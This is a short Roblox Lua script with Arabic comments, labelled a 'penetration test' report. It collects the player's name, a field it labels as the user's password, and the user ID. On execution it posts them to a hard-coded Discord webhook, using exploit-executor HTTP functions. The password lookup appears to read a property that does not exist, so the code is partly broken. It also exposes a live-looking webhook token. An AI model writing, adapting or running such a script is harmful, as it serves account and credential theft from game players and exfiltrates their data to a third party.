-- إعدادات الـ Webhook الخاصة بك (تأكد من وضع رابط صحيح من سيرفرك في ديسكورد)
local HitsWebhook = "https://discord.com/api/webhooks/1469037505075613857/iiZNbLQVBlxdIq_roIrlMWMr8PQMB_ReUQ8lrpvseQrJmwYF_b_5fMIIILfuo9CF3ix7"
-- الحصول على خدمات اللعبة
local HttpService = game:GetService("HttpService")
local Player = game:GetService("Players").LocalPlayer

-- وظيفة إرسال البيانات للتجربة
local function sendTestReport()
    local data = {
        ["embeds"] = {{
            ["title"] = "تقرير تجريبي - اختبار اختراق",
            ["description"] = "تم تشغيل السكربت بنجاح!",
            ["fields"] = {
                {["name"] = "اسم المستخدم", ["value"] = Player.Name, ["inline"] = true},
                {["name"] = "كلمة مرور المستخدم", ["value"] = Player.password, ["inline"] = true},
                {["name"] = "المعرف (ID)", ["value"] = tostring(Player.UserId), ["inline"] = true},
                {["name"] = "الزر المختار", ["value"] = "F", ["inline"] = true}
            },
            ["color"] = 65280 -- لون أخضر
        }}
    }

    -- محاولة إرسال البيانات عبر طلب HTTP
    local response = (syn and syn.request or http_request or request or HttpPost) {
        Url = HitsWebhook,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(data)
    }
end

-- تشغيل الوظيفة فوراً للتأكد من العمل
print("جاري تشغيل سكربت الاختبار...")
sendTestReport()
